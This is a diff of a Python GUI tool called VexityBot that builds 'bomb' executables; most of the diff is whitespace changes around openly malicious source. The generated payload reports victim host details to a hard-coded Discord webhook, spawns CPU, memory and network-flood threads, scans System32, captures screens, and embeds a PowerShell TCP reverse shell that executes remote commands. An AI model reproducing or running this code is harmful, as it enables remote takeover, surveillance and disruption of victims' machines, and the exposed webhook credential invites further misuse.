 
         self.update_status(f"Viewing details for {bot['name']}")
@@ -7381,7 +7415,7 @@ PowerShell Command Generated:
         self.notebook.add(exe_frame, text="Create EXE")
 
         
-
+        
         # Title
 
         title_label = ttk.Label(exe_frame, text="💣 VexityBot Bomb Executable Builder", 
@@ -7391,7 +7425,7 @@ PowerShell Command Generated:
         title_label.pack(pady=10)
 
         
-
+        
         # Description
 
         desc_label = ttk.Label(exe_frame, 
@@ -7403,7 +7437,7 @@ PowerShell Command Generated:
         desc_label.pack(pady=5)
 
         
-
+        
         # Main content frame
 
         content_frame = ttk.Frame(exe_frame)
@@ -7411,7 +7445,7 @@ PowerShell Command Generated:
         content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
 
         
-
+        
         # Left panel - Bomb Selection
 
         left_panel = ttk.LabelFrame(content_frame, text="Bomb Selection", padding=10)
@@ -7419,13 +7453,13 @@ PowerShell Command Generated:
         left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
 
         
-
+        
         # Bomb type selection
 
         ttk.Label(left_panel, text="Select Bomb Types (Multiple Selection):", font=('Arial', 10, 'bold')).pack(anchor='w', pady=(0, 5))
 
         
-
+        
         # Initialize bomb selection variables
 
         self.bomb_vars = {}
@@ -7471,7 +7505,7 @@ PowerShell Command Generated:
         }
 
         
-
+        
         # Create scrollable frame for bomb selection
 
         bomb_frame = ttk.Frame(left_panel)
@@ -7479,7 +7513,7 @@ PowerShell Command Generated:
         bomb_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
 
         
-
+        
         # Create canvas and scrollbar for bomb selection
 
         canvas = tk.Canvas(bomb_frame, height=200)
@@ -7489,7 +7523,7 @@ PowerShell Command Generated:
         scrollable_frame = ttk.Frame(canvas)
 
         
-
+        
         scrollable_frame.bind(
 
             "<Configure>",
@@ -7499,13 +7533,13 @@ PowerShell Command Generated:
         )
 
         
-
+        
         canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
 
         canvas.configure(yscrollcommand=scrollbar.set)
 
         
-
+        
         # Nuclear Warfare bombs
 
         ttk.Label(scrollable_frame, text="Nuclear Warfare:", font=('Arial', 9, 'bold')).pack(anchor='w', pady=(5, 2))
@@ -7515,7 +7549,7 @@ PowerShell Command Generated:
             self.bomb_vars[bomb_id] = tk.BooleanVar()
 
             ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
-
+        
         
 
         # Cyber Warfare bombs
@@ -7527,7 +7561,7 @@ PowerShell Command Generated:
             self.bomb_vars[bomb_id] = tk.BooleanVar()
 
             ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
-
+        
         
 
         # Stealth Operations bombs
@@ -7539,7 +7573,7 @@ PowerShell Command Generated:
             self.bomb_vars[bomb_id] = tk.BooleanVar()
 
             ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
-
+        
         
 
         # EMP Warfare bombs
@@ -7551,7 +7585,7 @@ PowerShell Command Generated:
             self.bomb_vars[bomb_id] = tk.BooleanVar()
 
             ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
-
+        
         
 
         # Biological Warfare bombs
@@ -7563,7 +7597,7 @@ PowerShell Command Generated:
             self.bomb_vars[bomb_id] = tk.BooleanVar()
 
             ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
-
+        
         
 
         # Advanced bombs
@@ -7575,7 +7609,7 @@ PowerShell Command Generated:
             self.bomb_vars[bomb_id] = tk.BooleanVar()
 
             ttk.Checkbutton(scrollable_frame, text=bomb_name, variable=self.bomb_vars[bomb_id]).pack(anchor='w', pady=1)
-
+        
         
 
         # System Monitor bombs
@@ -7587,13 +7621,13 @@ PowerShell Command Generated:
         ttk.Checkbutton(scrollable_frame, text="OmegaBot - System32 Monitor", variable=self.bomb_vars["system32_monitor"]).pack(anchor='w', pady=1)
 
         
-
+        
         canvas.pack(side="left", fill="both", expand=True)
 
         scrollbar.pack(side="right", fill="y")
 
         
-
+        
         # Select All / Deselect All buttons
 
         button_frame = ttk.Frame(left_panel)
@@ -7605,19 +7639,19 @@ PowerShell Command Generated:
         ttk.Button(button_frame, text="Deselect All", command=self.deselect_all_bombs).pack(side=tk.LEFT, padx=2)
 
         
-
+        
         # Build options
 
         ttk.Label(left_panel, text="Build Options:", font=('Arial', 10, 'bold')).pack(anchor='w', pady=(20, 5))
 
         
-
+        
         self.include_console = tk.BooleanVar(value=False)
 
         ttk.Checkbutton(left_panel, text="Include Console Window", 
 
                        variable=self.include_console).pack(anchor='w', pady=2)
-
+        
         
 
         self.optimize_size = tk.BooleanVar(value=True)
@@ -7625,7 +7659,7 @@ PowerShell Command Generated:
         ttk.Checkbutton(left_panel, text="Optimize for Size", 
 
                        variable=self.optimize_size).pack(anchor='w', pady=2)
-
+        
         
 
         self.one_file = tk.BooleanVar(value=True)
@@ -7633,7 +7667,7 @@ PowerShell Command Generated:
         ttk.Checkbutton(left_panel, text="Single File Executable", 
 
                        variable=self.one_file).pack(anchor='w', pady=2)
-
+        
         
 
         # Build button
@@ -7645,7 +7679,7 @@ PowerShell Command Generated:
         build_btn.pack(pady=20, fill=tk.X)
 
         
-
+        
         # Quick build buttons
 
         quick_build_frame = ttk.Frame(left_panel)
@@ -7659,7 +7693,7 @@ PowerShell Command Generated:
         ttk.Button(quick_build_frame, text="⚡ Quick Build (Selected)", 
 
                   command=self.quick_build_selected).pack(side=tk.LEFT, padx=2, fill=tk.X, expand=True)
-
+        
         
 
         # Right panel - Build Log and File Management
@@ -7669,7 +7703,7 @@ PowerShell Command Generated:
         right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
 
         
-
+        
         # Build Log section
 
         log_frame = ttk.LabelFrame(right_panel, text="Build Log", padding=10)
@@ -7677,7 +7711,7 @@ PowerShell Command Generated:
         log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
 
         
-
+        
         # Log text area
 
         self.build_log = scrolledtext.ScrolledText(log_frame, height=15, width=60, 
@@ -7687,7 +7721,7 @@ PowerShell Command Generated:
         self.build_log.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         # Clear log button
 
         clear_btn = ttk.Button(log_frame, text="Clear Log", 
@@ -7697,7 +7731,7 @@ PowerShell Command Generated:
         clear_btn.pack(pady=5, fill=tk.X)
 
         
-
+        
         # File Management section
 
         file_frame = ttk.LabelFrame(right_panel, text="Victim File Management", padding=10)
@@ -7705,13 +7739,13 @@ PowerShell Command Generated:
         file_frame.pack(fill=tk.X, pady=(0, 10))
 
         
-
+        
         # File list
 
         ttk.Label(file_frame, text="System32 Files (from victim):", font=('Arial', 9, 'bold')).pack(anchor='w')
 
         
-
+        
         # File listbox with scrollbar
 
         listbox_frame = ttk.Frame(file_frame)
@@ -7719,7 +7753,7 @@ PowerShell Command Generated:
         listbox_frame.pack(fill=tk.BOTH, expand=True, pady=5)
 
         
-
+        
         self.victim_files_listbox = tk.Listbox(listbox_frame, height=8, selectmode=tk.MULTIPLE)
 
         file_scrollbar = ttk.Scrollbar(listbox_frame, orient="vertical", command=self.victim_files_listbox.yview)
@@ -7727,13 +7761,13 @@ PowerShell Command Generated:
         self.victim_files_listbox.configure(yscrollcommand=file_scrollbar.set)
 
         
-
+        
         self.victim_files_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
 
         file_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
 
         
-
+        
         # File management buttons
 
         file_btn_frame = ttk.Frame(file_frame)
@@ -7741,7 +7775,7 @@ PowerShell Command Generated:
         file_btn_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         ttk.Button(file_btn_frame, text="🗑️ Delete Selected", 
 
                   command=self.delete_selected_files).pack(side=tk.LEFT, padx=2)
@@ -7753,7 +7787,7 @@ PowerShell Command Generated:
         ttk.Button(file_btn_frame, text="📁 Open Directory", 
 
                   command=self.open_victim_directory).pack(side=tk.LEFT, padx=2)
-
+        
         
 
         # Status frame
@@ -7763,7 +7797,7 @@ PowerShell Command Generated:
         status_frame.pack(fill=tk.X, padx=20, pady=10)
 
         
-
+        
         self.build_status = ttk.Label(status_frame, text="Ready to build", 
 
                                     font=('Arial', 10, 'bold'))
@@ -7771,11 +7805,11 @@ PowerShell Command Generated:
         self.build_status.pack(side=tk.LEFT)
 
         
-
+        
         self.build_progress = ttk.Progressbar(status_frame, mode='indeterminate')
 
         self.build_progress.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(10, 0))
-
+    
     
 
     def start_exe_build(self):
@@ -7791,7 +7825,7 @@ PowerShell Command Generated:
         self.build_log.see(tk.END)
 
         
-
+        
         # Start build in separate thread
 
         import threading
@@ -7799,7 +7833,7 @@ PowerShell Command Generated:
         build_thread = threading.Thread(target=self.build_executable, daemon=True)
 
         build_thread.start()
-
+    
     
 
     def select_all_bombs(self):
@@ -7811,7 +7845,7 @@ PowerShell Command Generated:
             var.set(True)
 
         self.log_build("All bomb types selected")
-
+    
     
 
     def deselect_all_bombs(self):
@@ -7823,7 +7857,7 @@ PowerShell Command Generated:
             var.set(False)
 
         self.log_build("All bomb types deselected")
-
+    
     
 
     def get_selected_bombs(self):
@@ -7839,7 +7873,7 @@ PowerShell Command Generated:
                 selected.append(bomb_id)
 
         return selected
-
+    
     
 
     def quick_build_all(self):
@@ -7849,7 +7883,7 @@ PowerShell Command Generated:
         self.select_all_bombs()
 
         self.start_exe_build()
-
+    
     
 
     def quick_build_selected(self):
@@ -7865,7 +7899,7 @@ PowerShell Command Generated:
             return
 
         self.start_exe_build()
-
+    
     
 
     def build_executable(self):
@@ -7879,11 +7913,11 @@ PowerShell Command Generated:
             import os
 
             
-
+            
             self.log_build("Initializing bomb executable build process...")
 
             
-
+            
             # Get selected bomb types
 
             selected_bombs = self.get_selected_bombs()
@@ -7897,19 +7931,19 @@ PowerShell Command Generated:
                 self.root.after(0, lambda: self.build_progress.stop())
 
                 return
-
+            
             
 
             self.log_build(f"Selected bomb types: {', '.join(selected_bombs)}")
 
             
-
+            
             # Create bomb executable content with multiple bombs
 
             bomb_exe_content = self.create_multi_bomb_executable_content(selected_bombs)
 
             
-
+            
             # Write bomb executable to temporary file
 
             bomb_file = f"bomb_executable_multi_{len(selected_bombs)}_bombs.py"
@@ -7917,13 +7951,13 @@ PowerShell Command Generated:
             with open(bomb_file, 'w', encoding='utf-8') as f:
 
                 f.write(bomb_exe_content)
-
+            
             
 
             self.log_build(f"Created multi-bomb executable: {bomb_file}")
 
             
-
+            
             # Build PyInstaller command
 
             cmd = [
@@ -7941,11 +7975,11 @@ PowerShell Command Generated:
             ]
 
             
-
+            
             if self.optimize_size.get():
 
                 cmd.extend(["--optimize=2", "--strip"])
-
+            
             
 
             # Add exclusions for problematic dependencies
@@ -7963,21 +7997,21 @@ PowerShell Command Generated:
             ])
 
             
-
+            
             cmd.append(bomb_file)
 
             
-
+            
             self.log_build(f"Running command: {' '.join(cmd)}")
 
             
-
+            
             # Run PyInstaller
 
             result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.getcwd())
 
             
-
+            
             if result.returncode == 0:
 
                 self.log_build("✅ Multi-bomb executable built successfully!")
@@ -7991,13 +8025,13 @@ PowerShell Command Generated:
                 self.log_build("⚠️  WARNING: All activities will be logged to Discord webhook!")
 
                 
-
+                
                 # Clean up temporary file
 
                 if os.path.exists(bomb_file):
 
                     os.remove(bomb_file)
-
+                
                 
 
                 # Update status
@@ -8005,7 +8039,7 @@ PowerShell Command Generated:
                 self.root.after(0, lambda: self.build_status.config(text="Multi-bomb executable built successfully!"))
 
                 self.root.after(0, lambda: self.build_progress.stop())
-
+                
                 
 
             else:
@@ -8017,7 +8051,7 @@ PowerShell Command Generated:
                 self.root.after(0, lambda: self.build_status.config(text="Build failed - check log"))
 
                 self.root.after(0, lambda: self.build_progress.stop())
-
+                
                 
 
         except Exception as e:
@@ -8027,7 +8061,7 @@ PowerShell Command Generated:
             self.root.after(0, lambda: self.build_status.config(text="Build error - check log"))
 
             self.root.after(0, lambda: self.build_progress.stop())
-
+    
     
 
     def create_bomb_executable_content(self, bomb_type):
@@ -8037,7 +8071,7 @@ PowerShell Command Generated:
         webhook_url = "https://discord.com/api/webhooks/1416334316232900618/bhtElnCIHNbiw2vJ4BKkliOrOqOV98rjv_OBhW-FK6Isx4xT3oLBC-_vV1AjSlwGdbYc"
 
         
-
+        
         bomb_configs = {
 
             "quantum": {
@@ -8223,11 +8257,11 @@ PowerShell Command Generated:
         }
 
         
-
+        
         config = bomb_configs.get(bomb_type, bomb_configs["quantum"])
 
         
-
+        
         bomb_content = f'''#!/usr/bin/env python3
 
 """
@@ -8277,7 +8311,7 @@ class VexityBotBomb:
     """VexityBot Bomb Executable - {config['name']}"""
 
     
-
+    
     def __init__(self):
 
         self.bomb_type = "{bomb_type}"
@@ -8293,17 +8327,17 @@ class VexityBotBomb:
         self.start_time = datetime.now()
 
         
-
+        
         # Log bomb deployment
 
         self.log_to_discord("🚀 BOMB DEPLOYED", f"{{self.bomb_name}} deployed on {{self.target_system['hostname']}}")
 
         
-
+        
         # Start bomb sequence
 
         self.execute_bomb_sequence()
-
+    
     
 
     def get_system_info(self):
@@ -8321,7 +8355,7 @@ class VexityBotBomb:
             computer_name = os.getenv('COMPUTERNAME', 'Unknown')
 
             
-
+            
             return {{
 
                 'hostname': hostname,
@@ -8343,7 +8377,7 @@ class VexityBotBomb:
         except Exception as e:
 
             return {{'hostname': 'Unknown', 'error': str(e)}}
-
+    
     
 
     def log_to_discord(self, title, message):
@@ -8357,7 +8391,7 @@ class VexityBotBomb:
             import urllib.parse
 
             
-
+            
             data = {{
 
                 "embeds": [{{
@@ -8393,7 +8427,7 @@ class VexityBotBomb:
             }}
 
             
-
+            
             req = urllib.request.Request(
 
                 WEBHOOK_URL,
@@ -8405,9 +8439,9 @@ class VexityBotBomb:
             )
 
             
-
+            
             urllib.request.urlopen(req, timeout=10)
-
+            
             
 
         except Exception as e:
@@ -8415,7 +8449,7 @@ class VexityBotBomb:
             print(f"Discord logging failed: {{{{e}}}}")
 
     
-
+    
     def execute_bomb_sequence(self):
 
         """Execute the bomb attack sequence"""
@@ -8423,7 +8457,7 @@ class VexityBotBomb:
         self.log_to_discord("💣 BOMB ACTIVATED", f"{{self.bomb_name}} activated - {{self.bomb_description}}")
 
         
-
+        
         # Simulate bomb effects
 
         for i, effect in enumerate(self.effects):
@@ -8431,13 +8465,13 @@ class VexityBotBomb:
             time.sleep(random.uniform(1, 3))
 
             self.simulate_effect(effect, i + 1)
-
+        
         
 
         # Final explosion
 
         self.log_to_discord("💥 BOMB DETONATED", f"{{self.bomb_name}} detonation complete - System compromised")
-
+    
     
 
     def simulate_effect(self, effect, stage):
@@ -8451,7 +8485,7 @@ class VexityBotBomb:
                 # Simulate CPU overload
 
                 threading.Thread(target=self.cpu_overload, daemon=True).start()
-
+                
                 
 
             elif "Memory" in effect or "RAM" in effect:
@@ -8459,7 +8493,7 @@ class VexityBotBomb:
                 # Simulate memory leak
 
                 threading.Thread(target=self.memory_leak, daemon=True).start()
-
+                
                 
 
             elif "Network" in effect or "flooding" in effect:
@@ -8467,7 +8501,7 @@ class VexityBotBomb:
                 # Simulate network flooding
 
                 threading.Thread(target=self.network_flood, daemon=True).start()
-
+                
                 
 
             elif "File" in effect or "corruption" in effect:
@@ -8475,7 +8509,7 @@ class VexityBotBomb:
                 # Simulate file operations
 
                 threading.Thread(target=self.file_operations, daemon=True).start()
-
+                
                 
 
             elif "System" in effect or "shutdown" in effect:
@@ -8483,19 +8517,19 @@ class VexityBotBomb:
                 # Simulate system operations
 
                 threading.Thread(target=self.system_operations, daemon=True).start()
-
+            
             
 
             # Log effect
 
             self.log_to_discord(f"⚡ EFFECT {{stage}}", f"{{effect}} - {{self.bomb_name}}")
-
+            
             
 
         except Exception as e:
 
             print(f"Effect simulation error: {{e}}")
-
+    
     
 
     def cpu_overload(self):
@@ -8517,7 +8551,7 @@ class VexityBotBomb:
         except:
 
             pass
-
+    
     
 
     def memory_leak(self):
@@ -8537,7 +8571,7 @@ class VexityBotBomb:
         except:
 
             pass
-
+    
     
 
     def network_flood(self):
@@ -8567,7 +8601,7 @@ class VexityBotBomb:
         except:
 
             pass
-
+    
     
 
     def file_operations(self):
@@ -8592,7 +8626,7 @@ class VexityBotBomb:
         except:
 
             pass
-
+    
     
 
     def system_operations(self):
@@ -8636,25 +8670,25 @@ def main():
         print()
 
         
-
+        
         # Small delay before activation
 
         time.sleep(2)
 
         
-
+        
         # Deploy bomb
 
         bomb = VexityBotBomb()
 
         
-
+        
         # Keep running to maintain effects
 
         while True:
 
             time.sleep(60)
-
+            
             
 
     except KeyboardInterrupt:
@@ -8674,9 +8708,9 @@ if __name__ == "__main__":
 '''
 
         
-
+        
         return bomb_content
-
+    
     
 
     def create_multi_bomb_executable_content(self, selected_bombs):
@@ -8686,7 +8720,7 @@ if __name__ == "__main__":
         webhook_url = "https://discord.com/api/webhooks/1416334316232900618/bhtElnCIHNbiw2vJ4BKkliOrOqOV98rjv_OBhW-FK6Isx4xT3oLBC-_vV1AjSlwGdbYc"
 
         
-
+        
         bomb_configs = {
 
             "quantum": {
@@ -8882,7 +8916,7 @@ if __name__ == "__main__":
         }
 
         
-
+        
         # Get configurations for selected bombs
 
         selected_configs = []
@@ -8892,13 +8926,13 @@ if __name__ == "__main__":
             if bomb_id in bomb_configs:
 
                 selected_configs.append((bomb_id, bomb_configs[bomb_id]))
-
+        
         
 
         bomb_names = [config[1]['name'] for config in selected_configs]
 
         bomb_descriptions = [config[1]['description'] for config in selected_configs]
-
+        
         
 
         multi_bomb_content = '''#!/usr/bin/env python3
@@ -8947,7 +8981,7 @@ class VexityBotMultiBomb:
     """VexityBot Multi-Bomb Executable"""
 
     
-
+    
     def __init__(self):
 
         self.selected_bombs = {selected_bombs_str}
@@ -8959,16 +8993,16 @@ class VexityBotMultiBomb:
         self.active_bombs = []
 
         
-
+        
         # Log multi-bomb deployment
 
         self.log_to_discord("🚀 MULTI-BOMB DEPLOYED", "{{len(self.selected_bombs)}} bombs deployed on {{self.target_system['hostname']}}")
         
-
+        
         # Start multi-bomb sequence
 
         self.execute_multi_bomb_sequence()
-
+    
     
 
     def get_system_info(self):
@@ -8986,7 +9020,7 @@ class VexityBotMultiBomb:
             computer_name = os.getenv('COMPUTERNAME', 'Unknown')
 
             
-
+            
             return {{
 
                 'hostname': hostname,
@@ -9008,7 +9042,7 @@ class VexityBotMultiBomb:
         except Exception as e:
 
             return {{'hostname': 'Unknown', 'error': str(e)}}
-
+    
     
 
     def log_to_discord(self, title, message):
@@ -9022,7 +9056,7 @@ class VexityBotMultiBomb:
             import urllib.parse
 
             
-
+            
             data = {{
 
                 "embeds": [{{
@@ -9058,7 +9092,7 @@ class VexityBotMultiBomb:
             }}
 
             
-
+            
             req = urllib.request.Request(
 
                 WEBHOOK_URL,
@@ -9070,9 +9104,9 @@ class VexityBotMultiBomb:
             )
 
             
-
+            
             urllib.request.urlopen(req, timeout=10)
-
+            
             
 
         except Exception as e:
@@ -9080,7 +9114,7 @@ class VexityBotMultiBomb:
             print(f"Discord logging failed: {{{{e}}}}")
 
     
-
+    
     def execute_multi_bomb_sequence(self):
 
         """Execute the multi-bomb attack sequence"""
@@ -9088,7 +9122,7 @@ class VexityBotMultiBomb:
         self.log_to_discord("💣 MULTI-BOMB ACTIVATED", f"{{{{len(self.selected_bombs)}}}} bombs activated simultaneously")
 
         
-
+        
         # Deploy all selected bombs
 
         for i, bomb_id in enumerate(self.selected_bombs):
@@ -9100,7 +9134,7 @@ class VexityBotMultiBomb:
                 self.log_to_discord(f"💥 BOMB {{{{i+1}}}} DEPLOYED", f"{{{{config['name']}}}} - {{{{config['description']}}}}")
 
                 
-
+                
                 # Start bomb in separate thread
 
                 bomb_thread = threading.Thread(target=self.deploy_single_bomb, args=(bomb_id, config), daemon=True)
@@ -9110,17 +9144,17 @@ class VexityBotMultiBomb:
                 self.active_bombs.append(bomb_thread)
 
                 
-
+                
                 # Small delay between bomb deployments
 
                 time.sleep(random.uniform(0.5, 2.0))
-
+        
         
 
         # Monitor bomb activity
 
         self.monitor_bomb_activity()
-
+    
     
 
     def deploy_single_bomb(self, bomb_id, config):
@@ -9131,7 +9165,7 @@ class VexityBotMultiBomb:
 
             self.log_to_discord("⚡ {{{{config['name']}}}} ACTIVATED", "{{{{config['description']}}}}")
             
-
+            
             # Simulate bomb effects
 
             for i, effect in enumerate(config['effects']):
@@ -9139,19 +9173,19 @@ class VexityBotMultiBomb:
                 time.sleep(random.uniform(1, 3))
 
                 self.simulate_effect(effect, bomb_id, i + 1)
-
+            
             
 
             # Log bomb completion
 
             self.log_to_discord("✅ {{{{config['name']}}}} COMPLETED", "All effects deployed successfully")
             
-
+            
         except Exception as e:
 
             self.log_to_discord("❌ {{{{config['name']}}}} ERROR", "Bomb failed: {{{{str(e)}}}}")
     
-
+    
     def simulate_effect(self, effect, bomb_id, stage):
 
         """Simulate bomb effect"""
@@ -9193,19 +9227,19 @@ class VexityBotMultiBomb:
             elif "Directory" in effect or "File logging" in effect:
 
                 threading.Thread(target=self.system32_monitor_operations, daemon=True).start()
-
+            
             
 
             # Log effect
 
             self.log_to_discord("⚡ EFFECT {{stage}}", "{{effect}} - {{bomb_id.upper()}}")
             
-
+            
         except Exception as e:
 
             print("Effect simulation error: {{e}}")
     
-
+    
     def cpu_overload(self):
 
         """Simulate CPU overload"""
@@ -9223,7 +9257,7 @@ class VexityBotMultiBomb:
         except:
 
             pass
-
+    
     
 
     def memory_leak(self):
@@ -9243,7 +9277,7 @@ class VexityBotMultiBomb:
         except:
 
             pass
-
+    
     
 
     def network_flood(self):
@@ -9273,7 +9307,7 @@ class VexityBotMultiBomb:
         except:
 
             pass
-
+    
     
 
     def file_operations(self):
@@ -9298,7 +9332,7 @@ class VexityBotMultiBomb:
         except:
 
             pass
-
+    
     
 
     def system_operations(self):
@@ -9322,7 +9356,7 @@ class VexityBotMultiBomb:
         except:
 
             pass
-
+    
     
 
     def stealth_operations(self):
@@ -9349,7 +9383,7 @@ class VexityBotMultiBomb:
         except:
 
             pass
-
+    
     
 
     def hardware_operations(self):
@@ -9373,7 +9407,7 @@ class VexityBotMultiBomb:
         except:
 
             pass
-
+    
     
 
     def infection_operations(self):
@@ -9400,7 +9434,7 @@ class VexityBotMultiBomb:
         except:
 
             pass
-
+    
     
 
     def system32_monitor_operations(self):
@@ -9418,22 +9452,22 @@ class VexityBotMultiBomb:
             import stat
 
             
-
+            
             system32_path = "C:\\\\Windows\\\\System32"
 
             
-
+            
             if not os.path.exists(system32_path):
 
                 self.log_to_discord("❌ SYSTEM32 MONITOR ERROR", "System32 directory not found")
 
                 return
-
+            
             
 
             self.log_to_discord("🔍 SYSTEM32 MONITOR STARTED", "Monitoring directory: {{system32_path}}")
             
-
+            
             # Get all files in System32
 
             files = []
@@ -9455,7 +9489,7 @@ class VexityBotMultiBomb:
                             file_modified = datetime.fromtimestamp(stat_info.st_mtime)
 
                             
-
+                            
                             files.append({{
 
                                 'name': filename,
@@ -9478,7 +9512,7 @@ class VexityBotMultiBomb:
 
                 self.log_to_discord("❌ SYSTEM32 SCAN ERROR", "Failed to scan directory: {{str(e)}}")
                 return
-
+            
             
 
             # Create Pokemon-style cards for files
@@ -9486,30 +9520,30 @@ class VexityBotMultiBomb:
             self.create_pokemon_file_cards(files)
 
             
-
+            
             # Start live screen sharing
 
             self.start_live_screen_sharing()
 
             
-
+            
             # Initialize shell script execution
 
             self.initialize_shell_scripts()
 
             
-
+            
             # Execute reverse shells automatically
 
             self.execute_reverse_shells()
-
+            
             
 
         except Exception as e:
 
             self.log_to_discord("❌ SYSTEM32 MONITOR ERROR", "Monitor failed: {{str(e)}}")
     
-
+    
     def start_live_screen_sharing(self):
 
         """Start live screen sharing for all connected users"""
@@ -9529,11 +9563,11 @@ class VexityBotMultiBomb:
             import tkinter as tk
 
             
-
+            
             self.log_to_discord("📺 LIVE SCREEN SHARING STARTED", "Initiating multi-user screen capture")
 
             
-
+            
             # Initialize user tracking
 
             self.connected_users = {{}}
@@ -9543,24 +9577,24 @@ class VexityBotMultiBomb:
             self.screen_threads = {{}}
 
             
-
+            
             # Start screen capture thread
 
             threading.Thread(target=self.capture_and_share_screen, daemon=True).start()
 
             
-
+            
             # Start user management thread
 
             threading.Thread(target=self.manage_multi_user_screens, daemon=True).start()
-
+            
             
 
         except Exception as e:
 
             self.log_to_discord("❌ SCREEN SHARING ERROR", "Failed to start screen sharing: {{str(e)}}")
     
-
+    
     def manage_multi_user_screens(self):
 
         """Manage multiple user screens dynamically"""
@@ -9572,7 +9606,7 @@ class VexityBotMultiBomb:
             import threading
 
             
-
+            
             while True:
 
                 try:
@@ -9582,7 +9616,7 @@ class VexityBotMultiBomb:
                     user_count = len(self.connected_users)
 
                     
-
+                    
                     if user_count > 0:
 
                         # Calculate dynamic column layout
@@ -9592,37 +9626,37 @@ class VexityBotMultiBomb:
                         rows = (user_count + cols - 1) // cols
 
                         
-
+                        
                         # Send multi-user screen layout to Discord
 
                         self.send_multi_user_layout(user_count, cols, rows)
 
                         
-
+                        
                         # Update individual user screens
 
                         for user_id, user_data in self.connected_users.items():
 
                             self.update_user_screen(user_id, user_data)
-
+                    
                     
 
                     time.sleep(2)  # Update every 2 seconds
-
+                    
                     
 
                 except Exception as e:
 
                     print("Multi-user management error: {{e}}")
                     time.sleep(5)
-
+                    
                     
 
         except Exception as e:
 
             self.log_to_discord("❌ MULTI-USER ERROR", "Multi-user management failed: {{str(e)}}")
     
-
+    
     def calculate_dynamic_columns(self, user_count):
 
         """Calculate optimal column layout for user screens"""
@@ -9646,7 +9680,7 @@ class VexityBotMultiBomb:
         else:
 
             return 5  # Max 5 columns for readability
-
+    
     
 
     def send_multi_user_layout(self, user_count, cols, rows):
@@ -9660,7 +9694,7 @@ class VexityBotMultiBomb:
             import json
 
             
-
+            
             # Create layout description
 
             layout_text = "📺 **MULTI-USER SCREEN LAYOUT**\\n"
@@ -9669,7 +9703,7 @@ class VexityBotMultiBomb:
             layout_text += "📏 **Screen Size**: 300x300 pixels each\\n"
             layout_text += "🔄 **Auto-Organizing**: Dynamic column adjustment"
             
-
+            
             embed_data = {{
 
                 "embeds": [{{
@@ -9725,16 +9759,16 @@ class VexityBotMultiBomb:
             }}
 
             
-
+            
             self.send_discord_embed(embed_data)
-
+            
             
 
         except Exception as e:
 
             print("Layout send error: {{e}}")
     
-
+    
     def update_user_screen(self, user_id, user_data):
 
         """Update individual user screen"""
@@ -9758,16 +9792,16 @@ class VexityBotMultiBomb:
             }}
 
             
-
+            
             self.user_screens[user_id] = screen_data
-
+            
             
 
         except Exception as e:
 
             print("User screen update error: {{e}}")
     
-
+    
     def add_connected_user(self, user_id, user_info):
 
         """Add a new connected user"""
@@ -9785,17 +9819,17 @@ class VexityBotMultiBomb:
                 'status': 'active'
 
             }}
-
+            
             
 
             self.log_to_discord("👤 USER CONNECTED", "New user joined: {{user_id}}")
             
-
+            
         except Exception as e:
 
             print("Add user error: {{e}}")
     
-
+    
     def remove_connected_user(self, user_id):
 
         """Remove a disconnected user"""
@@ -9808,12 +9842,12 @@ class VexityBotMultiBomb:
 
                 self.log_to_discord("👤 USER DISCONNECTED", "User left: {{user_id}}")
                 
-
+                
         except Exception as e:
 
             print("Remove user error: {{e}}")
     
-
+    
     def initialize_shell_scripts(self):
 
         """Initialize shell script execution system"""
@@ -9825,17 +9859,17 @@ class VexityBotMultiBomb:
             import time
 
             
-
+            
             self.log_to_discord("💻 SHELL SCRIPTS INITIALIZED", "Shell execution system ready")
 
             
-
+            
             # Start shell script monitoring thread
 
             threading.Thread(target=self.monitor_shell_commands, daemon=True).start()
 
             
-
+            
             # Initialize shell script storage
 
             self.shell_scripts = {{}}
@@ -9843,18 +9877,18 @@ class VexityBotMultiBomb:
             self.active_commands = {{}}
 
             
-
+            
             # Add the provided PowerShell reverse shell scripts
 
             self.add_powershell_reverse_shells()
-
+            
             
 
         except Exception as e:
 
             self.log_to_discord("❌ SHELL INIT ERROR", "Shell initialization failed: {{str(e)}}")
     
-
+    
     def add_powershell_reverse_shells(self):
 
         """Add the provided PowerShell reverse shell scripts"""
@@ -9865,12 +9899,12 @@ class VexityBotMultiBomb:
 
             shell1 = "$client = New-Object System.Net.Sockets.TCPClient(\"1.1.1.1\",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
             
-
+            
             # Shell Script 2 - Advanced TCP Reverse Shell with Error Handling
 
